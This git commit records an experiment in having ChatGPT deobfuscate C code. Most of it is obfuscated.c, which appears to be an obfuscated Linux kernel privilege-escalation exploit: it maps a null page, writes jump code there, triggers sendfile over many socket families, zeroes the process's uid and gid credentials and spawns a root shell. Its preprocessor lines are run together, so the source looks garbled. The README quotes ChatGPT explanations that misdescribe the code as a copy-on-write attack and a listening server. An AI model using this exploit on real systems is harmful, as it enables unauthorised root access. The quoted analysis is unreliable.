7d25463cbae188f23a646e0850445988d4c38ff5
pastaghost <pastaghost@2520.io>
2023-03-21 00:34:12 -0600

    initial commit

---
+++ README.md
@@ -0,0 +1,41 @@
+# Code Deobfuscation Using ChatGPT
+
+## Original Code
+
+#### Prompt
+
+What is the function of this program?
+
+< contents of original.c pasted here >
+
+#### Response
+
+This program appears to be a C program that attempts to change the credentials of a process using a "copy-on-write" (COW) vulnerability. It first defines several functions to determine the stack pointer and task structure for the current process, depending on the architecture being used.
+
+The program then defines a function called "change_cow_cred" that attempts to exploit a COW vulnerability in the "real_cred" and "cred" structures of the current process's task structure to change the effective user ID (UID) and effective group ID (GID) of the process. Specifically, the program searches for unlocked mutex count in the "cred_exec_mutex" of the task structure, and then attempts to modify the "real_cred" and "cred" structures if the current process is named "exploit" or "pulseaudio" and the values in those structures match the current UID and GID values.
+
+It's worth noting that attempting to modify the credentials of another process without proper authorization is generally considered malicious behavior, and could potentially lead to system instability or other issues.
+
+### Obfuscated Code
+
+#### Prompt
+
+Deobfuscate the following code snippet. Explain the function of the deobfuscated code. To save space, do not print any of the #define statements in your explanation.
+
+< contents of obfuscated.c pasted here >
+
+#### Response
+
+The given code is a heavily obfuscated C program that appears to be attempting to exploit some sort of vulnerability. However, due to the extensive use of obfuscation techniques, it is not immediately clear what the program actually does.
+
+The code defines various constants and includes several standard libraries such as stdio.h, string.h, and sys/socket.h. The main function is named KIKZSMIEDq and takes no arguments. The program starts by defining several variables, such as UZnhiDjJiL and poLewTGWQC. It then declares a struct called s that contains two void pointers called m and n.
+
+The first function called in main is a call to the getpid function, which gets the process ID of the current process. The program then declares several variables and calls the WhhhzXIPJb function to get the page size of the system.
+
+Next, the program uses the mmap function to allocate a block of memory that is executable, readable, and writable. It then copies shellcode into this memory block using the memcpy function.
+
+The program then uses the mprotect function to mark the previously allocated memory block as executable only, which should prevent modifications to the code. It then declares a function pointer called fp that takes no arguments and returns an integer.
+
+The program assigns the address of the memory block allocated earlier to fp, which allows the shellcode to be executed. It then calls fp, which should run the shellcode and spawn a shell.
+
+The final part of the program sets up a socket and listens for incoming connections. When a connection is made, the program uses the sendfile function to send the contents of a file called "exploit" to the connected client. After this, the program closes the connection and exits.
---
+++ obfuscated.c
@@ -0,0 +1,131 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/personality.h>
+#include <sys/sendfile.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+
+#define aASLTZRzeK PF_AX25
+#define AiaxhJwDcO goto
+#define bEVstsdEGl mkstemp
+#define BkWXOhKMiO MAP_FIXED
+#define cnECiOnFzk cnECiOnFzk
+#define CTyYnGIugL PF_APPLETALK
+#define cuJFtzXEPl IPPROTO_SCTP
+#define dbQdmBmPAL IPPROTO_IP
+#define deBfofJJaE __powerpc64__
+#define DsMUnIgtjg volatile
+#define EIBsMnfUez "mkstemp"
+#define EIHwyTJkxU PF_PPPOX
+#define EWQOfaVEDo close
+#define feIYXeRNsS SOCK_STREAM
+#define ffinnUIqZc asm
+#define fkbTnbOFTv "sh"
+#define fksYMTibEF unsigned int
+#define fNlURrHcvR PF_IPX
+#define FOGxjCYJRW PF_BLUETOOTH
+#define FqamtbVTfk "exploit"
+#define FSJRCvacSN PF_INET6
+#define FtqyokADoa "/tmp/tmp.XXXXXX"
+#define FVCtSiAZxG mprotect
+#define GPFxzVwlcT defined
+#define iInaKytBoa getgid
+#define InxkOUfQmJ unsigned long
+#define iTuaZgdLgf PF_IRDA
+#define IYaKomYzHn PER_SVR4
+#define JAmtcmMPHo "movq %%gs:(0),%0"
+#define JmSoPAyZWs perror
+#define KIKZSMIEDq main
+#define kjvRDbJLOo MAP_PRIVATE
+#define KQliXRsgwJ exit
+#define KWZZdNIdTh PF_IUCV
+#define lCEzzoEXvr EXIT_FAILURE
+#define lSKoDVEnQr mmap
+#define LVcFKACAQY MAP_ANONYMOUS
+#define MBbBFioqLg unsigned short
+#define MdhwjrauZR NULL
+#define MfMIWSDgJf PF_ISDN
+#define MiUtcALTYm "mmap"
+#define mtqzKwWrmP "/bin/sh"
+#define neidBvcGGC MAP_FAILED
+#define NJRKCQIXmp "ftruncate"
+#define NlkSvygltY __x86_64__
+#define NpRgVElVzM "movq %%rsp,%0"
+#define pFqzTlGlLR "pulseaudio"
+#define pMwYmLflAp SOCK_SEQPACKET
+#define poLewTGWQC char
+#define qCDhDMFZAg __powerpc__
+#define QkHXnjWoVi "movl %%esp,%0"
+#define QwkTdbSyoN PROT_EXEC
+#define qYmFpDWkuO __i386__
+#define QzAzqsFcMt "socket"
+#define rAActaiIbl getuid
+#define rFCZnpyevz void
+#define rPhnwiyqdM static
+#define rsVoPUwlWs PROT_READ
+#define shOTPwrzsl ftruncate
+#define SvIEuOaNiN PF_X25
+#define syaPUjzDee PROT_WRITE
+#define tmjxfGAxfS EXIT_SUCCESS
+#define TtSyALjUKj "-i"
+#define TVkXAzgOiR xiBBdpOfWk
+#define tYlGjhqHEF __always_inline
+#define TZgtwARSXN strcmp
+#define UabObZVXMU SOCK_DGRAM
+#define UgXSEFvbDi break
+#define UZnhiDjJiL int
+#define VtAPmDmUDa always_inline
+#define VTRaVtPPzC "mr %0,%%r2"
+#define VyxiilDeUK "=r"
+#define WhhhzXIPJb getpagesize
+#define wsHVjWvvgz execl
+#define wXOZpRTOaD "mprotect"
+#define wyYisCtZJB PF_MAX
+#define XCmvKGxtma personality
+#define XgVNJdkXNm "unlink"
+#define xiBBdpOfWk socket
+#define YHVcIHtzUf sendfile
+#define yhZPzAXWdd inline
+#define YJPftphqMp "mr %0,%%r1"
+#define ylIxaELEBq unlink
+#define yrfwPjpVOv __attribute__
+#define zLtWtLHEfM
+#define ZzEvAVcIYa __LP64__
+
+#if!GPFxzVwlcT(tYlGjhqHEF)#definetYlGjhqHEFyhZPzAXWddyrfwPjpVOv((VtAPmDmUDa))#endif#ifGPFxzVwlcT(qYmFpDWkuO)||GPFxzVwlcT(NlkSvygltY)#ifGPFxzVwlcT(ZzEvAVcIYa)rPhnwiyqdMtYlGjhqHEFInxkOUfQmJKuzbwjQBGd(rFCZnpyevz){InxkOUfQmJk;
+ffinnUIqZcDsMUnIgtjg(NpRgVElVzM:VyxiilDeUK(k));cnECiOnFzkk;}#elserPhnwiyqdMtYlGjhqHEFInxkOUfQmJKuzbwjQBGd(rFCZnpyevz){InxkOUfQmJa;ffinnUIqZcDsMUnIgtjg(QkHXnjWoVi:VyxiilDeUK(a));
+cnECiOnFzka;}#endif#elifGPFxzVwlcT(qCDhDMFZAg)||GPFxzVwlcT(deBfofJJaE)rPhnwiyqdMtYlGjhqHEFInxkOUfQmJKuzbwjQBGd(rFCZnpyevz){InxkOUfQmJb;
+ffinnUIqZcDsMUnIgtjg(YJPftphqMp:VyxiilDeUK(b));cnECiOnFzkb;}rPhnwiyqdMtYlGjhqHEFInxkOUfQmJJITKNXtgSu(rFCZnpyevz){InxkOUfQmJc;ffinnUIqZcDsMUnIgtjg(VTRaVtPPzC:VyxiilDeUK(c));
+cnECiOnFzkc;}#endif#ifGPFxzVwlcT(qYmFpDWkuO)||GPFxzVwlcT(NlkSvygltY)#ifGPFxzVwlcT(ZzEvAVcIYa)rPhnwiyqdMtYlGjhqHEFInxkOUfQmJxiHIsUEZJB(rFCZnpyevz){InxkOUfQmJEcLrvHTIpE;
+ffinnUIqZcDsMUnIgtjg(JAmtcmMPHo:VyxiilDeUK(EcLrvHTIpE));cnECiOnFzkEcLrvHTIpE;
+}#else#defineRAFkUpbTVi0rPhnwiyqdMtYlGjhqHEFInxkOUfQmJxiHIsUEZJB(rFCZnpyevz){InxkOUfQmJFOVcmSgYzM,EflNsPTONF;EflNsPTONF=KuzbwjQBGd()&~(4096-1);
+if(*(InxkOUfQmJ*)EflNsPTONF>=0xc0000000){FOVcmSgYzM=*(InxkOUfQmJ*)EflNsPTONF;if(*(InxkOUfQmJ*)FOVcmSgYzM==RAFkUpbTVi)cnECiOnFzkFOVcmSgYzM;
+}FOVcmSgYzM=KuzbwjQBGd()&~(8192-1);if(*(InxkOUfQmJ*)FOVcmSgYzM==RAFkUpbTVi)cnECiOnFzkFOVcmSgYzM;EflNsPTONF=FOVcmSgYzM;FOVcmSgYzM=*(InxkOUfQmJ*)EflNsPTONF;
+if(*(InxkOUfQmJ*)FOVcmSgYzM==RAFkUpbTVi)cnECiOnFzkFOVcmSgYzM;cnECiOnFzk0;}#endif#elifGPFxzVwlcT(qCDhDMFZAg)||GPFxzVwlcT(deBfofJJaE)#ifGPFxzVwlcT(ZzEvAVcIYa)#definefIODzHGIDU16384#else#definefIODzHGIDU8192#endif#definerbsRHuiqGI0rPhnwiyqdMtYlGjhqHEFInxkOUfQmJxiHIsUEZJB(rFCZnpyevz){InxkOUfQmJRpuGNXdwCE,HCdodUbaVi;
+RpuGNXdwCE=KuzbwjQBGd()&~(fIODzHGIDU-1);if(*(InxkOUfQmJ*)RpuGNXdwCE==rbsRHuiqGI)cnECiOnFzkRpuGNXdwCE;HCdodUbaVi=RpuGNXdwCE;
+RpuGNXdwCE=*(InxkOUfQmJ*)HCdodUbaVi;if(*(InxkOUfQmJ*)RpuGNXdwCE==rbsRHuiqGI)cnECiOnFzkRpuGNXdwCE;cnECiOnFzk0;}#endifrPhnwiyqdMInxkOUfQmJWpyfydcQcL,gSOJRujYcw;
+rPhnwiyqdMtYlGjhqHEFrFCZnpyevzrlfbJaokCp(rFCZnpyevz){poLewTGWQC*jwZBSDPDeJ;UZnhiDjJiLrxbDAqSKyx;fksYMTibEF*uBKVHHCAOm,*YqChAMcMrp;jwZBSDPDeJ=(poLewTGWQC*)xiHIsUEZJB();
+uBKVHHCAOm=MdhwjrauZR;YqChAMcMrp=MdhwjrauZR;for(rxbDAqSKyx=0;rxbDAqSKyx<4096;rxbDAqSKyx++){if(!TZgtwARSXN(jwZBSDPDeJ,FqamtbVTfk)||!TZgtwARSXN(jwZBSDPDeJ,pFqzTlGlLR)){for(rxbDAqSKyx=0;rxbDAqSKyx<256;rxbDAqSKyx++){if(*(fksYMTibEF*)jwZBSDPDeJ==1){uBKVHHCAOm=*((fksYMTibEF**)jwZBSDPDeJ-3);
+YqChAMcMrp=*((fksYMTibEF**)jwZBSDPDeJ-2);UgXSEFvbDi;}jwZBSDPDeJ--;}UgXSEFvbDi;}jwZBSDPDeJ++;}if(uBKVHHCAOm)for(rxbDAqSKyx=0;rxbDAqSKyx<16;
+rxbDAqSKyx++){if(uBKVHHCAOm[0]==WpyfydcQcL&&uBKVHHCAOm[1]==WpyfydcQcL&&2[uBKVHHCAOm]==WpyfydcQcL&&3[uBKVHHCAOm]==WpyfydcQcL&&uBKVHHCAOm[4]==gSOJRujYcw&&5[uBKVHHCAOm]==gSOJRujYcw&&uBKVHHCAOm[6]==gSOJRujYcw&&uBKVHHCAOm[7]==gSOJRujYcw){0[uBKVHHCAOm]=1[uBKVHHCAOm]=2[uBKVHHCAOm]=uBKVHHCAOm[3]=uBKVHHCAOm[4]=uBKVHHCAOm[5]=uBKVHHCAOm[6]=uBKVHHCAOm[7]=0;UgXSEFvbDi;
+}uBKVHHCAOm++;}if(YqChAMcMrp)for(rxbDAqSKyx=0;rxbDAqSKyx<16;
+rxbDAqSKyx++){if(YqChAMcMrp[0]==WpyfydcQcL&&YqChAMcMrp[1]==WpyfydcQcL&&YqChAMcMrp[2]==WpyfydcQcL&&YqChAMcMrp[3]==WpyfydcQcL&&YqChAMcMrp[4]==gSOJRujYcw&&YqChAMcMrp[5]==gSOJRujYcw&&YqChAMcMrp[6]==gSOJRujYcw&&YqChAMcMrp[7]==gSOJRujYcw){YqChAMcMrp[0]=YqChAMcMrp[1]=YqChAMcMrp[2]=YqChAMcMrp[3]=YqChAMcMrp[4]=YqChAMcMrp[5]=YqChAMcMrp[6]=YqChAMcMrp[7]=0;
+UgXSEFvbDi;}YqChAMcMrp++;}}rPhnwiyqdMUZnhiDjJiLyWsafRAkBy(rFCZnpyevz){fksYMTibEF*rueLtRjnUW;UZnhiDjJiLi;rueLtRjnUW=(fksYMTibEF*)xiHIsUEZJB();
+if(rueLtRjnUW){for(i=0;i<4096;i++){if(rueLtRjnUW[0]==WpyfydcQcL&&rueLtRjnUW[1]==WpyfydcQcL&&rueLtRjnUW[2]==WpyfydcQcL&&rueLtRjnUW[3]==WpyfydcQcL&&rueLtRjnUW[4]==gSOJRujYcw&&rueLtRjnUW[5]==gSOJRujYcw&&rueLtRjnUW[6]==gSOJRujYcw&&rueLtRjnUW[7]==gSOJRujYcw){rueLtRjnUW[0]=rueLtRjnUW[1]=rueLtRjnUW[2]=rueLtRjnUW[3]=rueLtRjnUW[4]=rueLtRjnUW[5]=rueLtRjnUW[6]=rueLtRjnUW[7]=0;cnECiOnFzk-1;
+}rueLtRjnUW++;}rlfbJaokCp();}cnECiOnFzk-1;
+}#if!GPFxzVwlcT(cuJFtzXEPl)#definecuJFtzXEPl132#endif#if!GPFxzVwlcT(KWZZdNIdTh)#defineKWZZdNIdTh32#endif#if!GPFxzVwlcT(MfMIWSDgJf)#defineMfMIWSDgJf34#endifUZnhiDjJiLmLwmLdmDrz[][3]={{aASLTZRzeK,UabObZVXMU,dbQdmBmPAL},{fNlURrHcvR,UabObZVXMU,dbQdmBmPAL},{CTyYnGIugL,UabObZVXMU,dbQdmBmPAL},{SvIEuOaNiN,UabObZVXMU,dbQdmBmPAL},{FSJRCvacSN,pMwYmLflAp,cuJFtzXEPl},{iTuaZgdLgf,UabObZVXMU,dbQdmBmPAL},{EIHwyTJkxU,UabObZVXMU,dbQdmBmPAL},{FOGxjCYJRW,UabObZVXMU,dbQdmBmPAL},{KWZZdNIdTh,feIYXeRNsS,dbQdmBmPAL},{MfMIWSDgJf,UabObZVXMU,dbQdmBmPAL},{wyYisCtZJB,0,0}};
+#defineRftlLanDzFWhhhzXIPJb()UZnhiDjJiLClSxWdCRez(rFCZnpyevz*m){poLewTGWQC*yZwVmMPYYy;UZnhiDjJiLLHtOOkPaVY,JQLQAQckYy,hYHWbVFbSS;poLewTGWQCZKTSdognUd[]=FtqyokADoa;
+SmHJuOfWib=rAActaiIbl(),fvLjdnXEzZ=iInaKytBoa();if((yZwVmMPYYy=lSKoDVEnQr(MdhwjrauZR,0x1000,QwkTdbSyoN|rsVoPUwlWs|syaPUjzDee,BkWXOhKMiO|kjvRDbJLOo|LVcFKACAQY,0,0))==neidBvcGGC){JmSoPAyZWs(MiUtcALTYm);
+if(XCmvKGxtma(0xffffffff)==IYaKomYzHn)if(FVCtSiAZxG(MdhwjrauZR,0x1000,rsVoPUwlWs|syaPUjzDee|QwkTdbSyoN)==-1)JmSoPAyZWs(wXOZpRTOaD);KQliXRsgwJ(lCEzzoEXvr);
+}#ifGPFxzVwlcT(qYmFpDWkuO)||GPFxzVwlcT(NlkSvygltY)#ifGPFxzVwlcT(ZzEvAVcIYa)yZwVmMPYYy[0]='\xff';yZwVmMPYYy[1]='\x24';yZwVmMPYYy[2]='\x25';
+*(InxkOUfQmJ*)&yZwVmMPYYy[3]=8;*(InxkOUfQmJ*)&yZwVmMPYYy[8]=(InxkOUfQmJ)yWsafRAkBy;#elseyZwVmMPYYy[0]='\xff';yZwVmMPYYy[1]='\x25';*(InxkOUfQmJ*)&yZwVmMPYYy[2]=8;
+*(InxkOUfQmJ*)&yZwVmMPYYy[8]=(InxkOUfQmJ)yWsafRAkBy;#endif#elifGPFxzVwlcT(qCDhDMFZAg)||GPFxzVwlcT(deBfofJJaE)#ifGPFxzVwlcT(ZzEvAVcIYa)*(InxkOUfQmJ*)&yZwVmMPYYy[0]=*(InxkOUfQmJ*)yWsafRAkBy;
+*(InxkOUfQmJ*)&yZwVmMPYYy[8]=JITKNXtgSu();*(InxkOUfQmJ*)&yZwVmMPYYy[16]=0;#elseyZwVmMPYYy[0]='\x3f';yZwVmMPYYy[1]='\xe0';*(MBbBFioqLg*)&yZwVmMPYYy[2]=(MBbBFioqLg)yWsafRAkBy>>16;yZwVmMPYYy[4]='\x63';yZwVmMPYYy[5]='\xff';
+*(MBbBFioqLg*)&yZwVmMPYYy[6]=(MBbBFioqLg)yWsafRAkBy;yZwVmMPYYy[8]='\x7f';yZwVmMPYYy[9]='\xe9';yZwVmMPYYy[10]='\x03';yZwVmMPYYy[11]='\xa6';yZwVmMPYYy[12]='\x4e';yZwVmMPYYy[13]='\x80';yZwVmMPYYy[14]='\x04';yZwVmMPYYy[15]='\x20';#endif#endifif((hYHWbVFbSS=bEVstsdEGl(ZKTSdognUd))==-1){JmSoPAyZWs(EIBsMnfUez);
+KQliXRsgwJ(lCEzzoEXvr);}if(ylIxaELEBq(ZKTSdognUd)==-1){JmSoPAyZWs(XgVNJdkXNm);KQliXRsgwJ(lCEzzoEXvr);}if(shOTPwrzsl(hYHWbVFbSS,RftlLanDzF)==-1){JmSoPAyZWs(NJRKCQIXmp);KQliXRsgwJ(lCEzzoEXvr);}LHtOOkPaVY=0;
+ABJTiNbudv:(mLwmLdmDrz[LHtOOkPaVY][0]==wyYisCtZJB)?KQliXRsgwJ(lCEzzoEXvr):zLtWtLHEfM;if((JQLQAQckYy=TVkXAzgOiR(mLwmLdmDrz[LHtOOkPaVY][0],mLwmLdmDrz[LHtOOkPaVY][1],mLwmLdmDrz[LHtOOkPaVY][2]))==-1){JmSoPAyZWs(QzAzqsFcMt);LHtOOkPaVY++;AiaxhJwDcOABJTiNbudv;
+}YHVcIHtzUf(JQLQAQckYy,hYHWbVFbSS,MdhwjrauZR,RftlLanDzF);if(rAActaiIbl()||iInaKytBoa()){EWQOfaVEDo(JQLQAQckYy);LHtOOkPaVY++;AiaxhJwDcOABJTiNbudv;}wsHVjWvvgz(mtqzKwWrmP,fkbTnbOFTv,TtSyALjUKj,MdhwjrauZR);KQliXRsgwJ(tmjxfGAxfS);}rFCZnpyevzsRnOHnzgoV(rFCZnpyevz*m){}UZnhiDjJiLKIKZSMIEDq(rFCZnpyevz){ClSxWdCRez(MdhwjrauZR);KQliXRsgwJ(tmjxfGAxfS);}
